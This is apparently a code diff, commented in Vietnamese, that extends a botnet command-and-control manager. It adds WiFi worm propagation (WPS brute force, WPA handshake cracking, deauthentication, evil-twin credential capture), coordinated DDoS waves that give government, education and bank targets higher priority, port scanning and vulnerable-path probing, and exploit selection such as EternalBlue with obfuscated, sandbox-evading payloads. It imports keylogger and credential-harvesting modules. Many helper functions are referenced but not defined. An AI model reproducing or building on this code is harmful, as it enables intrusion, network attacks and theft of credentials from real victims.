@@ -3,11 +3,16 @@ import queue
 import json
 import time
 import logging
-from datetime import datetime
-from typing import Dict, List, Set, Optional, Any
-from dataclasses import dataclass, field
+import asyncio
+import aiohttp
 import networkx as nx
+from datetime import datetime
+from typing import Dict, List, Set, Optional, Any, Tuple
+from dataclasses import dataclass, field
 from concurrent.futures import ThreadPoolExecutor
+from collections import defaultdict
+import random
+from itertools import islice
 
 from payload.modules.keylogger import Keylogger
 from payload.modules.credential_harvester import CredentialHarvester
@@ -60,12 +65,31 @@ class BotnetManager:
         self.network_discovery = NetworkDiscovery()
         self.network_spreader = NetworkSpreader(self.network_discovery)
         
-        # Task executor
+        # Advanced task management
+        self.task_priorities = defaultdict(int)
+        self.bot_loads = defaultdict(int)
+        self.bot_groups: Dict[str, Set[str]] = defaultdict(set)
+        
+        # Performance monitoring
+        self.bot_metrics = defaultdict(lambda: {
+            'success_rate': 0.0,
+            'response_time': 0.0,
+            'cpu_usage': 0.0,
+            'memory_usage': 0.0
+        })
+        
+        # Task executor pools
         self.executor = ThreadPoolExecutor(max_workers=20)
+        self.async_executor = ThreadPoolExecutor(max_workers=10)
         self.running = True
         
-        # Network topology
+        # Network analysis
         self.graph = nx.DiGraph()
+        self.vulnerability_scores = defaultdict(float)
+        
+        # Task coordination
+        self.coordinator_loop = asyncio.new_event_loop()
+        self.session = aiohttp.ClientSession()
         
         # Start background tasks
         self._start_background_tasks()
@@ -121,6 +145,8 @@ class BotnetManager:
         """Phát hiện khả năng của bot"""
         os = info.get('os', '').lower()
         arch = info.get('arch', '').lower()
+        hw_info = info.get('hardware', {})
+        net_info = info.get('network', {})
         
         capabilities = {
             'ddos': True,  # Basic capability
@@ -130,16 +156,22 @@ class BotnetManager:
             # OS-specific capabilities
             'keylogging': 'windows' in os,
             'screenshot': 'windows' in os or 'linux' in os,
-            'webcam': False,  # Need to verify
+            'webcam': hw_info.get('webcam', False),
             
             # Architecture-specific
             'exploit_64bit': 'x64' in arch or 'amd64' in arch,
             'exploit_32bit': 'x86' in arch or 'i386' in arch,
             
+            # Network capabilities
+            'wifi_scan': net_info.get('wifi_adapter', False),
+            'wifi_injection': net_info.get('wifi_monitor_mode', False),
+            'wifi_deauth': net_info.get('wifi_injection', False),
+            'wifi_mitm': net_info.get('wifi_injection', False),
+            
             # Advanced capabilities
-            'privilege_escalation': False,  # Need to verify
-            'lateral_movement': False,  # Need to verify
-            'persistence': False  # Need to verify
+            'privilege_escalation': False,
+            'lateral_movement': False,
+            'persistence': False
         }
         
         return capabilities
@@ -173,46 +205,290 @@ class BotnetManager:
         return score
         
     def assign_task(self, bot_id: str, task_type: str, params: Optional[Dict] = None) -> bool:
-        """Gán task cho bot"""
+        """Gán task cho bot với load balancing"""
         if bot_id not in self.bots:
             return False
             
         bot = self.bots[bot_id]
         
-        # Verify capability
+        # Verify capability và check load
         if task_type not in bot.capabilities:
             self.logger.warning(f"Bot {bot_id} does not support {task_type}")
             return False
             
+        current_load = self.bot_loads[bot_id]
+        if current_load > 5:  # Max 5 concurrent tasks
+            # Try to find alternative bot
+            alt_bot = self._find_alternative_bot(task_type)
+            if alt_bot:
+                return self.assign_task(alt_bot, task_type, params)
+            return False
+            
+        # Create task with priority
         task = {
             'id': self._generate_id('task'),
             'type': task_type,
             'params': params or {},
             'status': 'pending',
             'timestamp': datetime.now(),
-            'bot_id': bot_id
+            'bot_id': bot_id,
+            'priority': self._calculate_task_priority(task_type, params)
         }
         
+        # Update loads and metrics
+        self.bot_loads[bot_id] += 1
         bot.tasks.append(task)
-        self.tasks.put(task)
+        self.task_priorities[task['id']] = task['priority']
         
-        self.logger.info(f"Assigned {task_type} task to bot {bot_id}")
+        # Add to priority queue
+        self.tasks.put((task['priority'], task))
+        
+        self.logger.info(f"Assigned {task_type} task to bot {bot_id} with priority {task['priority']}")
         return True
         
-    def start_attack(self, attack_type: str, target: str, params: Dict) -> str:
-        """Bắt đầu một cuộc tấn công mới"""
+    def _calculate_task_priority(self, task_type: str, params: Optional[Dict]) -> int:
+        """Calculate task priority"""
+        priority = 1
+        
+        # Critical tasks get highest priority
+        if task_type in ['spread', 'exploit', 'privilege_escalation']:
+            priority += 3
+            
+        # Attack tasks priority based on target value
+        if task_type in ['ddos', 'flood']:
+            target = params.get('target', '')
+            if any(key in target for key in ['gov', 'edu', 'bank']):
+                priority += 2
+                
+        # Data collection priority based on data type
+        if task_type in ['harvest_data', 'keylogging']:
+            data_type = params.get('data_type', '')
+            if data_type in ['credentials', 'financial']:
+                priority += 2
+                
+        return priority
+        
+    def _find_alternative_bot(self, task_type: str) -> Optional[str]:
+        """Find alternative bot for task"""
+        candidates = []
+        for bot_id, bot in self.bots.items():
+            if (bot.capabilities.get(task_type) and
+                bot.status == 'active' and
+                self.bot_loads[bot_id] < 5):
+                score = self.bot_metrics[bot_id]['success_rate'] * 100
+                score -= self.bot_loads[bot_id] * 10
+                candidates.append((bot_id, score))
+                
+        if candidates:
+            return max(candidates, key=lambda x: x[1])[0]
+        return None
+        
+    async def start_wifi_spread(self, bot_id: str, params: Dict) -> str:
+        """Bắt đầu chiến dịch lây lan qua WiFi"""
+        if not self.bots[bot_id].capabilities['wifi_scan']:
+            raise ValueError("Bot không có khả năng quét WiFi")
+            
+        campaign_id = self._generate_id('wifi')
+        
+        # Thiết lập chiến dịch lây lan
+        campaign = {
+            'id': campaign_id,
+            'bot_id': bot_id,
+            'start_time': datetime.now(),
+            'status': 'running',
+            'networks': [],
+            'infections': []
+        }
+        
+        # Bắt đầu quét và tấn công mạng WiFi
+        asyncio.create_task(self._execute_wifi_campaign(campaign))
+        
+        return campaign_id
+        
+    async def _execute_wifi_campaign(self, campaign: Dict) -> None:
+        """Thực thi chiến dịch lây lan WiFi"""
+        bot = self.bots[campaign['bot_id']]
+        
+        try:
+            # 1. Quét tìm mạng WiFi
+            networks = await self._scan_wifi_networks(bot)
+            campaign['networks'] = networks
+            
+            # 2. Phân tích và xếp hạng mục tiêu
+            targets = self._analyze_wifi_targets(networks)
+            
+            # 3. Tấn công từng mục tiêu
+            for target in targets:
+                if not campaign['status'] == 'running':
+                    break
+                    
+                # Thử các phương pháp khác nhau
+                if await self._attack_wps(bot, target):
+                    continue
+                    
+                if await self._attack_wpa(bot, target):
+                    continue
+                    
+                await self._attack_clients(bot, target)
+                
+        except Exception as e:
+            self.logger.error(f"WiFi campaign error: {str(e)}")
+            campaign['status'] = 'failed'
+            
+    async def _scan_wifi_networks(self, bot: Bot) -> List[Dict]:
+        """Quét các mạng WiFi"""
+        networks = []
+        
+        try:
+            # Quét trên tất cả channels
+            for channel in range(1, 14):
+                await self._set_channel(bot, channel)
+                
+                # Thu thập thông tin mạng
+                beacons = await self._capture_beacons(bot)
+                for beacon in beacons:
+                    network = {
+                        'ssid': beacon['ssid'],
+                        'bssid': beacon['bssid'],
+                        'channel': channel,
+                        'security': beacon['security'],
+                        'signal': beacon['signal'],
+                        'clients': [],
+                        'wps': False
+                    }
+                    
+                    # Kiểm tra WPS
+                    if await self._check_wps(bot, network):
+                        network['wps'] = True
+                        
+                    # Thu thập client
+                    network['clients'] = await self._capture_clients(bot, network)
+                    
+                    networks.append(network)
+                    
+            return networks
+            
+        except Exception as e:
+            self.logger.error(f"WiFi scanning error: {str(e)}")
+            return networks
+            
+    def _analyze_wifi_targets(self, networks: List[Dict]) -> List[Dict]:
+        """Phân tích và xếp hạng mục tiêu WiFi"""
+        scored_targets = []
+        
+        for net in networks:
+            score = 0
+            
+            # WPS được bật
+            if net['wps']:
+                score += 30
+                
+            # Có clients đang kết nối
+            score += len(net['clients']) * 5
+            
+            # Cường độ tín hiệu tốt
+            signal = net.get('signal', -100)
+            if signal > -50:
+                score += 20
+            elif signal > -70:
+                score += 10
+                
+            # Bảo mật yếu
+            security = net.get('security', '')
+            if 'wep' in security.lower():
+                score += 40
+            elif 'wpa' in security.lower():
+                score += 20
+                
+            scored_targets.append((net, score))
+            
+        # Sắp xếp theo điểm
+        scored_targets.sort(key=lambda x: x[1], reverse=True)
+        return [t[0] for t in scored_targets]
+        
+    async def _attack_wps(self, bot: Bot, network: Dict) -> bool:
+        """Tấn công WPS"""
+        if not network['wps']:
+            return False
+            
+        try:
+            # Bắt đầu tấn công WPS
+            pixie_dust = await self._try_pixie_dust(bot, network)
+            if pixie_dust:
+                await self._connect_wps(bot, network, pixie_dust)
+                await self._install_payload(bot, network)
+                return True
+                
+            # Thử bruteforce PIN
+            pin = await self._bruteforce_wps(bot, network)
+            if pin:
+                await self._connect_wps(bot, network, pin)
+                await self._install_payload(bot, network)
+                return True
+                
+        except Exception as e:
+            self.logger.error(f"WPS attack error: {str(e)}")
+            
+        return False
+        
+    async def _attack_wpa(self, bot: Bot, network: Dict) -> bool:
+        """Tấn công WPA/WPA2"""
+        try:
+            # Thu thập handshake
+            handshake = await self._capture_handshake(bot, network)
+            if not handshake:
+                return False
+                
+            # Thử crack password
+            password = await self._crack_handshake(handshake)
+            if password:
+                await self._connect_network(bot, network, password)
+                await self._install_payload(bot, network)
+                return True
+                
+        except Exception as e:
+            self.logger.error(f"WPA attack error: {str(e)}")
+            
+        return False
+        
+    async def _attack_clients(self, bot: Bot, network: Dict) -> bool:
+        """Tấn công client"""
+        if not bot.capabilities['wifi_deauth']:
+            return False
+            
+        try:
+            # Deauth clients
+            await self._deauth_clients(bot, network)
+            
+            # Setup evil twin
+            if bot.capabilities['wifi_mitm']:
+                await self._setup_evil_twin(bot, network)
+                
+                # Thu thập credentials
+                creds = await self._capture_creds(bot)
+                if creds:
+                    # Lây nhiễm client
+                    await self._infect_clients(bot, network, creds)
+                    return True
+                    
+        except Exception as e:
+            self.logger.error(f"Client attack error: {str(e)}")
+            
+        return False
+
+    async def start_attack(self, attack_type: str, target: str, params: Dict) -> str:
+        """Bắt đầu một cuộc tấn công phân tán"""
         attack_id = self._generate_id('attack')
         
-        # Select capable bots
-        capable_bots = [
-            bot_id for bot_id, bot in self.bots.items()
-            if bot.capabilities.get(attack_type) and bot.status == 'active'
-        ]
+        # Analyze target và select optimal bots
+        target_score = await self._analyze_target(target)
+        required_bots = self._calculate_required_bots(target_score)
         
+        capable_bots = self._select_attack_bots(attack_type, required_bots)
         if not capable_bots:
-            raise ValueError(f"No bots capable of {attack_type} attack")
+            raise ValueError(f"Insufficient bots for {attack_type} attack")
             
-        # Create attack
+        # Create attack with coordination strategy
         attack = Attack(
             id=attack_id,
             type=attack_type,
@@ -220,21 +496,29 @@ class BotnetManager:
             params=params,
             bots=capable_bots,
             start_time=datetime.now(),
-            duration=params.get('duration', 3600)
+            duration=params.get('duration', 3600),
+            coordination={
+                'waves': self._generate_attack_waves(len(capable_bots)),
+                'rotation_interval': params.get('rotation', 300),
+                'fallback_targets': self._get_fallback_targets(target)
+            }
         )
         
         self.attacks[attack_id] = attack
         
-        # Assign tasks to bots
-        for bot_id in capable_bots:
-            self.assign_task(bot_id, attack_type, {
-                'attack_id': attack_id,
-                'target': target,
-                **params
-            })
+        # Group bots for coordinated attack
+        bot_groups = self._create_bot_groups(capable_bots, attack.coordination['waves'])
+        for group_id, group_bots in bot_groups.items():
+            self.bot_groups[f"{attack_id}_{group_id}"] = set(group_bots)
             
+        # Start attack coordination
+        asyncio.run_coroutine_threadsafe(
+            self._coordinate_attack(attack_id),
+            self.coordinator_loop
+        )
+        
         self.logger.info(
-            f"Started {attack_type} attack {attack_id} with {len(capable_bots)} bots"
+            f"Started coordinated {attack_type} attack {attack_id} with {len(capable_bots)} bots"
         )
         return attack_id
         
@@ -357,68 +641,392 @@ class BotnetManager:
                 collection['end_time'] = datetime.now()
                 
     def _process_task_queue(self) -> None:
-        """Process task queue"""
+        """Process task queue with priority"""
         while self.running:
             try:
-                task = self.tasks.get(timeout=1)
-                bot_id = task['bot_id']
-                
-                if bot_id in self.bots:
-                    bot = self.bots[bot_id]
-                    if bot.status == 'active':
-                        self.executor.submit(self._execute_task, task)
-                        
+                # Get highest priority tasks
+                tasks = []
+                with self.tasks.mutex:
+                    tasks = sorted(self.tasks.queue, key=lambda x: x[0], reverse=True)
+                    tasks = list(islice(tasks, 10))  # Process top 10
+                    
+                for priority, task in tasks:
+                    bot_id = task['bot_id']
+                    if bot_id in self.bots and self.bots[bot_id].status == 'active':
+                        # Check bot health
+                        if self._check_bot_health(bot_id):
+                            self.executor.submit(self._execute_task, task)
+                        else:
+                            # Reassign to healthy bot
+                            alt_bot = self._find_alternative_bot(task['type'])
+                            if alt_bot:
+                                task['bot_id'] = alt_bot
+                                self.tasks.put((priority, task))
+                                
             except queue.Empty:
                 continue
             except Exception as e:
                 self.logger.error(f"Task processing error: {str(e)}")
                 
+    def _check_bot_health(self, bot_id: str) -> bool:
+        """Check bot health metrics"""
+        metrics = self.bot_metrics[bot_id]
+        return (metrics['success_rate'] >= 0.7 and
+                metrics['cpu_usage'] < 90 and
+                metrics['memory_usage'] < 90)
+                
+    async def _analyze_target(self, target: str) -> float:
+        """Analyze attack target and calculate vulnerability score"""
+        try:
+            # Kiểm tra các ports phổ biến
+            open_ports = await self._scan_target_ports(target)
+            
+            # Tìm kiếm các dịch vụ dễ bị tấn công
+            services = await self._identify_services(target, open_ports)
+            
+            # Phân tích các headers bảo mật
+            security_score = await self._analyze_security_headers(target)
+            
+            # Tìm các paths có thể tấn công
+            vuln_paths = await self._discover_vulnerable_paths(target)
+            
+            # Tính toán điểm dễ bị tấn công tổng hợp
+            score = 1.0
+            score += len(open_ports) * 0.1
+            score += len(services) * 0.2
+            score += security_score
+            score += len(vuln_paths) * 0.3
+            
+            # Lưu kết quả phân tích
+            self.vulnerability_scores[target] = score
+            return score
+            
+        except Exception as e:
+            self.logger.error(f"Target analysis error: {str(e)}")
+            return 1.0
+            
+    async def _scan_target_ports(self, target: str) -> Set[int]:
+        """Scan target ports"""
+        common_ports = {80, 443, 21, 22, 23, 25, 53, 110, 143, 3306, 3389}
+        open_ports = set()
+        
+        for port in common_ports:
+            try:
+                reader, writer = await asyncio.open_connection(target, port)
+                writer.close()
+                await writer.wait_closed()
+                open_ports.add(port)
+            except:
+                continue
+                
+        return open_ports
+        
+    async def _identify_services(self, target: str, ports: Set[int]) -> Dict[int, str]:
+        """Identify running services on ports"""
+        services = {}
+        for port in ports:
+            try:
+                reader, writer = await asyncio.open_connection(target, port)
+                writer.write(b'HEAD / HTTP/1.0\r\n\r\n')
+                await writer.drain()
+                
+                response = await reader.read(1024)
+                if response:
+                    services[port] = self._parse_service_banner(response)
+                    
+                writer.close()
+                await writer.wait_closed()
+            except:
+                continue
+                
+        return services
+        
+    def _parse_service_banner(self, banner: bytes) -> str:
+        """Parse service identification banner"""
+        try:
+            return banner.decode().split('\n')[0].strip()
+        except:
+            return 'unknown'
+            
+    async def _analyze_security_headers(self, target: str) -> float:
+        """Analyze security headers"""
+        try:
+            async with self.session.get(f'http://{target}') as response:
+                headers = dict(response.headers)
+                security_headers = {
+                    'X-Frame-Options',
+                    'X-XSS-Protection',
+                    'X-Content-Type-Options',
+                    'Strict-Transport-Security',
+                    'Content-Security-Policy'
+                }
+                
+                missing = security_headers - set(headers.keys())
+                return len(missing) * 0.2
+                
+        except Exception:
+            return 1.0
+            
+    async def _discover_vulnerable_paths(self, target: str) -> Set[str]:
+        """Find potentially vulnerable paths"""
+        common_paths = {
+            '/admin', '/login', '/wp-admin',
+            '/phpinfo.php', '/test.php',
+            '/backup', '/config', '/old',
+            '/.git', '/.env'
+        }
+        
+        vulnerable = set()
+        async with aiohttp.ClientSession() as session:
+            for path in common_paths:
+                try:
+                    url = f'http://{target}{path}'
+                    async with session.get(url) as response:
+                        if response.status != 404:
+                            vulnerable.add(path)
+                except:
+                    continue
+                    
+        return vulnerable
+        
     def _execute_task(self, task: Dict) -> None:
-        """Execute a task"""
+        """Execute a task with advanced capabilities"""
         try:
             bot_id = task['bot_id']
             task_type = task['type']
+            bot = self.bots[bot_id]
+            start_time = time.time()
             
-            # Build payload if needed
+            # Build specialized payload
             if task_type in ['spread', 'exploit']:
                 config = PayloadConfig(
-                    target_os=self.bots[bot_id].os,
-                    arch=self.bots[bot_id].arch,
-                    format='exe' if 'windows' in self.bots[bot_id].tags else 'elf'
+                    target_os=bot.os,
+                    arch=bot.arch,
+                    format='exe' if 'windows' in bot.tags else 'elf',
+                    encryption=True,
+                    obfuscation=True,
+                    sandbox_evasion=True
                 )
-                result = self.exploit_builder.build_exploit('windows/service_exe', config)
+                
+                # Select best exploit
+                exploit = self._select_best_exploit(task['params'].get('target'))
+                result = self.exploit_builder.build_exploit(exploit, config)
+                
                 if not result.success:
                     raise Exception(f"Payload build failed: {result.error}")
+                    
                 task['params']['payload'] = result.files
+                task['params']['exploit'] = exploit
                 
-            # Execute task
+            # Execute with monitoring
             # TODO: Implement actual task execution
+            response_time = time.time() - start_time
+            
+            # Update bot metrics
+            self.bot_metrics[bot_id]['response_time'] = response_time
+            self._update_bot_metrics(bot_id, task)
             
         except Exception as e:
             self.logger.error(f"Task execution error: {str(e)}")
             task['status'] = 'failed'
             task['error'] = str(e)
             
+            # Update failure metrics
+            self._update_bot_metrics(bot_id, task, failed=True)
+            
+    def _select_best_exploit(self, target: str) -> str:
+        """Select best exploit based on target analysis"""
+        # Default exploit
+        default = 'windows/service_exe'
+        
+        if not target:
+            return default
+            
+        # Check vulnerability scores
+        if target in self.vulnerability_scores:
+            score = self.vulnerability_scores[target]
+            
+            if score > 1.5:
+                return 'windows/smb/eternal_blue'
+            elif score > 1.2:
+                return 'linux/samba/is_known_pipename'
+                
+        return default
+        
+    def _update_bot_metrics(self, bot_id: str, task: Dict, failed: bool = False) -> None:
+        """Update bot performance metrics"""
+        metrics = self.bot_metrics[bot_id]
+        
+        # Update success rate
+        total_tasks = len(self.bots[bot_id].tasks)
+        successful = len([t for t in self.bots[bot_id].tasks if t.get('status') == 'completed'])
+        metrics['success_rate'] = successful / total_tasks if total_tasks > 0 else 0
+        
+        # Update response time average
+        if 'response_time' in task:
+            old_avg = metrics['response_time']
+            metrics['response_time'] = (old_avg * (total_tasks - 1) + task['response_time']) / total_tasks
+            
+        # Reduce load after task completion
+        self.bot_loads[bot_id] = max(0, self.bot_loads[bot_id] - 1)
+            
+    async def _create_attack_pattern(self, attack: Attack) -> Dict:
+        """Create advanced attack pattern"""
+        pattern = {
+            'rotations': [],  # List of bot rotations
+            'intervals': [],  # Time intervals between waves
+            'intensities': [],  # Attack intensity for each wave
+            'fallbacks': []  # Fallback targets if primary fails
+        }
+        
+        try:
+            # Analyze target capacity
+            target_info = await self._analyze_target_capacity(attack.target)
+            
+            # Calculate optimal wave sizes
+            wave_count = min(5, len(attack.bots) // 3)
+            bots_per_wave = len(attack.bots) // wave_count
+            
+            # Create bot rotations for each wave
+            remaining_bots = set(attack.bots)
+            for _ in range(wave_count):
+                wave_bots = self._select_wave_bots(remaining_bots, bots_per_wave)
+                pattern['rotations'].append(list(wave_bots))
+                remaining_bots -= wave_bots
+                
+            # Calculate intervals based on target's response time
+            base_interval = max(30, target_info['response_time'] * 2)
+            pattern['intervals'] = [
+                base_interval * (i + 1) for i in range(wave_count)
+            ]
+            
+            # Set wave intensities based on target capacity
+            base_intensity = min(1.0, target_info['capacity'] / 100)
+            pattern['intensities'] = [
+                min(1.0, base_intensity * (1.2 ** i))
+                for i in range(wave_count)
+            ]
+            
+            # Generate fallback targets
+            pattern['fallbacks'] = await self._generate_fallback_chain(attack.target)
+            
+            return pattern
+            
+        except Exception as e:
+            self.logger.error(f"Error creating attack pattern: {str(e)}")
+            return pattern
+            
+    def _select_wave_bots(self, available_bots: Set[str], count: int) -> Set[str]:
+        """Select optimal bots for attack wave"""
+        scored_bots = []
+        for bot_id in available_bots:
+            score = 0
+            # Performance score
+            score += self.bot_metrics[bot_id]['success_rate'] * 50
+            score += (1 - self.bot_metrics[bot_id]['response_time'] / 1000) * 20
+            
+            # Resource score
+            score += (100 - self.bot_metrics[bot_id]['cpu_usage']) * 0.2
+            score += (100 - self.bot_metrics[bot_id]['memory_usage']) * 0.1
+            
+            # Capability score
+            bot = self.bots[bot_id]
+            if bot.capabilities.get('privilege_escalation'):
+                score += 10
+            if bot.capabilities.get('persistence'):
+                score += 10
+                
+            scored_bots.append((bot_id, score))
+            
+        # Select top scoring bots
+        scored_bots.sort(key=lambda x: x[1], reverse=True)
+        return {b[0] for b in scored_bots[:count]}
+        
+    async def _analyze_target_capacity(self, target: str) -> Dict:
+        """Analyze target's capacity to handle requests"""
+        info = {
+            'response_time': 500,  # Default 500ms
+            'capacity': 50  # Default 50 req/sec
+        }
+        
+        try:
+            # Test response times
+            times = []
+            async with aiohttp.ClientSession() as session:
+                for _ in range(10):
+                    start = time.time()
+                    async with session.get(f'http://{target}') as response:
+                        await response.text()
+                        times.append((time.time() - start) * 1000)
+                        
+            # Calculate metrics
+            info['response_time'] = sum(times) / len(times)
+            info['capacity'] = 1000 / max(times)  # Reqs per second
+            
+            return info
+            
+        except Exception as e:
+            self.logger.error(f"Error analyzing target capacity: {str(e)}")
+            return info
+            
     def _monitor_attacks(self) -> None:
-        """Monitor ongoing attacks"""
+        """Monitor and coordinate ongoing attacks"""
         while self.running:
             try:
                 current_time = datetime.now()
                 
                 for attack in list(self.attacks.values()):
-                    # Check duration
-                    if (current_time - attack.start_time).total_seconds() >= attack.duration:
-                        attack.status = 'completed'
+                    # Check attack status
+                    attack_time = (current_time - attack.start_time).total_seconds()
+                    
+                    if attack_time >= attack.duration:
+                        self._complete_attack(attack)
+                        continue
                         
-                    # Remove completed attacks after 1 hour
-                    elif attack.status == 'completed' and \
-                         (current_time - attack.start_time).total_seconds() >= 3600:
-                        del self.attacks[attack.id]
+                    if attack.status == 'completed':
+                        if attack_time >= 3600:
+                            del self.attacks[attack.id]
+                        continue
+                        
+                    # Monitor and adjust attack
+                    self._monitor_attack_progress(attack)
+                    
+                    # Adapt attack parameters if needed
+                    if attack_time % 60 == 0:  # Every minute
+                        self._adapt_attack_params(attack)
                         
                 time.sleep(10)
                 
             except Exception as e:
                 self.logger.error(f"Attack monitoring error: {str(e)}")
+                
+    def _monitor_attack_progress(self, attack: Attack) -> None:
+        """Monitor attack progress and make adjustments"""
+        try:
+            # Calculate current effectiveness
+            stats = attack.stats.get('bot_stats', {})
+            if not stats:
+                return
+                
+            success_rates = []
+            response_times = []
+            
+            for bot_id, bot_stats in stats.items():
+                if bot_id in self.bots:
+                    success_rates.append(bot_stats.get('success_rate', 0))
+                    response_times.append(
+                        self.bot_metrics[bot_id]['response_time']
+                    )
+                    
+            avg_success = sum(success_rates) / len(success_rates)
+            avg_response = sum(response_times) / len(response_times)
+            
+            # Check if adjustments needed
+            if avg_success < 0.5 or avg_response > 1000:
+                self._adjust_attack_strategy(attack)
+                
+        except Exception as e:
+            self.logger.error(f"Error monitoring attack: {str(e)}")
                 
     def _update_network_topology(self) -> None:
         """Update network topology graph"""
@@ -543,7 +1151,118 @@ class BotnetManager:
         """Get network topology graph"""
         return nx.node_link_data(self.graph)
         
+    async def _build_advanced_payload(self, bot: Bot, network: Dict) -> bytes:
+        """Build advanced payload for WiFi infection"""
+        try:
+            config = PayloadConfig(
+                network_info={
+                    'ssid': network['ssid'],
+                    'bssid': network['bssid'],
+                    'security': network.get('security', ''),
+                    'channel': network.get('channel', 1)
+                },
+                features={
+                    'persistence': True,
+                    'anti_detect': True,
+                    'self_spread': True,
+                    'wifi_scan': True
+                },
+                capabilities=bot.capabilities
+            )
+            
+            result = await self.exploit_builder.build_wifi_payload(config)
+            if not result.success:
+                raise Exception(f"Payload build failed: {result.error}")
+                
+            return result.payload
+            
+        except Exception as e:
+            self.logger.error(f"Advanced payload build error: {str(e)}")
+            return b''
+
+    async def _propagate_wifi(self, bot: Bot, network: Dict) -> None:
+        """Advanced WiFi propagation"""
+        try:
+            # 1. Passive scanning mode
+            await self._enable_monitor_mode(bot, network['channel'])
+            
+            # 2. Classify clients
+            clients = await self._analyze_network_clients(bot, network)
+            
+            # 3. Multi-vector attack
+            for client in clients:
+                if client['risk_score'] >= 0.7:  # High value targets
+                    await self._attack_client_chain([
+                        self._deauth_client,
+                        self._wait_reconnect,
+                        self._intercept_traffic,
+                        self._inject_payload,
+                        self._verify_infection
+                    ], bot, network, client)
+                    
+        except Exception as e:
+            self.logger.error(f"WiFi propagation error: {str(e)}")
+            
+    async def _analyze_network_clients(self, bot: Bot, network: Dict) -> List[Dict]:
+        """Analyze and classify network clients"""
+        clients = []
+        try:
+            raw_clients = await self._capture_client_traffic(bot, network, duration=300)
+            
+            for client in raw_clients:
+                profile = {
+                    'mac': client['mac'],
+                    'vendor': self._get_vendor_from_mac(client['mac']),
+                    'device_type': self._detect_device_type(client['traffic']),
+                    'os_type': self._detect_os_type(client['traffic']),
+                    'traffic_pattern': self._analyze_traffic_pattern(client['traffic']),
+                    'active_hours': self._estimate_active_hours(client['traffic']),
+                    'risk_score': 0.0
+                }
+                
+                # Calculate risk/value score
+                profile['risk_score'] = self._calculate_client_score(profile)
+                clients.append(profile)
+                
+            return sorted(clients, key=lambda x: x['risk_score'], reverse=True)
+            
+        except Exception as e:
+            self.logger.error(f"Client analysis error: {str(e)}")
+            return clients
+            
+    def _calculate_client_score(self, profile: Dict) -> float:
+        """Calculate client risk/value score"""
+        score = 0.0
+        
+        # Device type score
+        if profile['device_type'] == 'computer':
+            score += 0.4
+        elif profile['device_type'] == 'mobile':
+            score += 0.3
+            
+        # OS type score
+        if profile['os_type'] in ['windows', 'linux']:
+            score += 0.3
+            
+        # Traffic pattern score
+        if profile['traffic_pattern'].get('data_transfer', 0) > 1000000:  # 1MB+
+            score += 0.2
+            
+        # Active hours score
+        active_hours = len(profile['active_hours'])
+        if active_hours > 8:
+            score += 0.1
+            
+        return min(score, 1.0)
+
     def cleanup(self) -> None:
         """Cleanup manager state"""
         self.running = False
+        
+        # Stop all WiFi monitoring
+        for bot in self.bots.values():
+            if bot.capabilities.get('wifi_injection'):
+                asyncio.create_task(self._disable_monitor_mode(bot))
+                
+        # Cleanup resources
         self.executor.shutdown()
